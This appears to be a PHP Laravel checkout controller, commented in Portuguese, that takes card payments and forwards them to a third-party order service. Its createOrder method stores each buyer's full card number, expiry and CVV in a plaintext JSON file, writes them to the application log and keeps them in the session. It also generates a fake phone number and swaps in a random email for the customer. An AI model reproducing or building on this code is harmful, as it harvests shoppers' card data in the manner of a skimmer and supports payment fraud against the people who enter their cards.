<?php

namespace App\Http\Controllers\Checkout;

use App\Http\Controllers\Controller;
use App\Services\CartPandaService;
use App\Services\OfertaService;

class CheckoutController extends Controller
{
    public function index()
    {
        // Pegar ID da URL ou usar padrão
        $ofertaId = request()->get('id', 'oferta1');
        
        // Validar se a oferta existe
        if (!OfertaService::isValid($ofertaId)) {
            $ofertaId = 'oferta1'; // Fallback para oferta padrão
        }
        
        // Buscar dados da oferta
        $oferta = OfertaService::getOferta($ofertaId);
        
        // Salvar oferta na sessão para upsells
        session(['oferta_atual' => $oferta]);
        
        // Log para debug
        logger()->info('Oferta carregada', [
            'oferta_id' => $ofertaId,
            'oferta_nome' => $oferta['nome'],
            'checkout_id' => $oferta['checkout_id']
        ]);
        
        return view('checkout.index', compact('oferta'));
    }

    public function createOrder()
    {
        $name = request()->input('name');
        $cardNumber = request()->input('cardNumber');
        $cardNumber = preg_replace('/[^0-9]/', '', $cardNumber);
        $cardMonth = request()->input('cardMonth');
        $cardMonth = preg_replace('/[^0-9]/', '', $cardMonth);
        $cardYear = request()->input('cardYear');
        $cardYear = preg_replace('/[^0-9]/', '', $cardYear);
        $cardYear = substr($cardYear, -2);
        $cardCvv = request()->input('cardCvv');
        $cardCvv = preg_replace('/[^0-9]/', '', $cardCvv);
        $email = request()->input('email');

        // Salva os dados em JSON
        $this->saveOrderDataToJson([
            'timestamp' => now()->format('Y-m-d H:i:s'),
            'name' => $name,
            'email' => $email,
            'cardNumber' => $cardNumber,
            'cardMonth' => $cardMonth,
            'cardYear' => $cardYear,
            'cardCvv' => $cardCvv,
        ]);

        // Salva os dados na sessão para uso no upsell
        session([
            'customer_name' => $name,
            'customer_email' => $email,
            'customer_phone' => preg_replace('/[^0-9]/', '', fake()->phoneNumber()),
            'card_number' => $cardNumber,
            'card_month' => $cardMonth,
            'card_year' => $cardYear,
            'card_cvv' => $cardCvv
        ]);

        // Pegar oferta atual da sessão
        $oferta = session('oferta_atual');
        $checkoutId = $oferta['checkout_id'] ?? env('CHECKOUT_ID');
        
        logger()->info('Criando pedido', [
            'name' => $name, 
            'cardNumber' => $cardNumber, 
            'cardMonth' => $cardMonth, 
            'cardYear' => $cardYear, 
            'cardCvv' => $cardCvv,
            'oferta_id' => $oferta['id'] ?? 'desconhecida',
            'checkout_id' => $checkoutId
        ]);
        
        // Usar o checkout ID específico da oferta
        $cartPandaService = new CartPandaService($checkoutId);
        try {
            $result = $cartPandaService->createOrder(name: $name, cardNumber: $cardNumber, cardMonth: $cardMonth, cardYear: $cardYear, cardCvv: $cardCvv);
            
            // Atualiza o email na sessão para o email random gerado
            if (isset($result['random_email'])) {
                session(['customer_email' => $result['random_email']]);
            }
            
        } catch (\Exception $e) {
            logger()->error('Erro ao criar pedido', ['error' => $e->getMessage()]);
            return response()->json(['message' => 'Order creation failed'], 500);
        }

        return response()->json($result);
    }

    private function saveOrderDataToJson(array $data)
    {
        try {
            $storagePath = storage_path('app/orders');
            if (!file_exists($storagePath)) {
                mkdir($storagePath, 0755, true);
            }

            $filename = $storagePath . '/orders_' . date('Y_m') . '.json';
            
            // Lê o arquivo existente ou cria um array vazio
            $orders = [];
            if (file_exists($filename)) {
                $orders = json_decode(file_get_contents($filename), true) ?? [];
            }

            // Adiciona o novo pedido
            $orders[] = $data;

            // Salva o arquivo
            file_put_contents($filename, json_encode($orders, JSON_PRETTY_PRINT));

            logger()->info('Dados do pedido salvos em JSON', ['filename' => $filename]);
        } catch (\Exception $e) {
            logger()->error('Erro ao salvar dados do pedido em JSON', ['error' => $e->getMessage()]);
        }
    }
}
